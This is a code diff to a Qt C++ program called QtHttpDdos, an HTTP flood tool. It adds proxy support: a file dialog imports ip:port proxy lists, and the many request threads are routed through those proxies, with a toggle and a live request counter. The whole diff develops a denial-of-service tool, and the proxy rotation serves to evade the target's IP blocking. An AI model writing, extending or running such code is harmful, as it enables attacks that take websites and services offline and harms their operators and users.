@@ -2,11 +2,14 @@
 #include "ui_QtHttpDdos.h"
 
 #include <QMessageBox>
+#include <QFileDialog>
 
 QtHttpDdos::QtHttpDdos(QWidget *parent) :
     QWidget(parent),
     ui(new Ui::QtHttpDdos)
 {
+
+    m_pIsProxyIp = false;
     m_pFlushRequestCountTimer = new QTimer();
     m_pIsNewThread = true;
     connect(m_pFlushRequestCountTimer,SIGNAL(timeout()),this,
@@ -38,15 +41,26 @@ void QtHttpDdos::startRequest()
             m_pThreadList.enqueue(thread);
 
             QHttpThread *http_request = new QHttpThread(url,count,ua,cookie);
+            if(m_pIsProxyIp){
+                http_request->switchProxyIp(m_pIsProxyIp);
+                for(int j = 0; j < m_pProxyIpList.length(); j++){
+                    http_request->addProxyIp(m_pProxyIpList.at(j));
+                    http_request->addProxyPort(m_pProxyPortList.at(j));
+                }
+            }
 
             m_pHttpList.enqueue(http_request);
-
             http_request->moveToThread(thread);
         }
         startThread();
     }else{
         //开启暂停的线程
         for(int i = 0; i < m_pHttpList.length(); i++){
+            if(m_pIsProxyIp){
+                m_pHttpList[i]->switchProxyIp(true);
+            }else{
+                m_pHttpList[i]->switchProxyIp(false);
+            }
             m_pHttpList[i]->startThread();
         }
     }
@@ -82,14 +96,36 @@ void QtHttpDdos::on_controllerpbn_clicked()
 //导入代理ip
 void QtHttpDdos::on_importIpbtn_clicked()
 {
-    QMessageBox::information(this,"提示","该功能正在开发");
+    QString fileName =
+            QFileDialog::getOpenFileName(this, tr("open file"), " ",  tr("全部文件(*.*);;文本文件(*.txt)"));
+    qDebug() << fileName;
+    QFile file(fileName);
+    if (file.open(QFile::ReadOnly | QFile::Text))
+    {
+        QTextStream toText(&file);
+        //设置文件流编码方式
+        toText.setCodec("GBK");
+        QStringList ip_port;
+        QString line;
+        while(toText.readLineInto(&line)){
+            qDebug()<<line;
+            ip_port = line.split(":");
+            qDebug() << ip_port.at(0) << ip_port.at(1);
+            m_pProxyIpList.enqueue(ip_port.at(0));
+            m_pProxyPortList.enqueue(ip_port.at(1));
+            //            for(int i = 0;i < m_pHttpList.length(); i++){
+            //                m_pHttpList.at(i)->addProxyIp(ip_port.at(0));
+            //                m_pHttpList.at(i)->addProxyPort(ip_port.at(1));
+            //            }
+        }
+    }
 }
 //刷新界面访问次数
 void QtHttpDdos::slot_flushRequestCount()
 {
     int64_t totalCount = 0;
     for(int i = 0; i < m_pHttpList.length(); i++){
-         totalCount += m_pHttpList[i]->getRequestCount();
+        totalCount += m_pHttpList[i]->getRequestCount();
     }
 
     if(totalCount < 0)
@@ -98,3 +134,12 @@ void QtHttpDdos::slot_flushRequestCount()
 }
 
 
+//设置是否启用代理ip
+void QtHttpDdos::on_proxyIdRbtn_clicked(bool checked)
+{
+    qDebug() << checked;
+    m_pIsProxyIp = checked;
+    for(int i = 0;i < m_pHttpList.length(); i++){
+        m_pHttpList.at(i)->switchProxyIp(checked);
+    }
+}
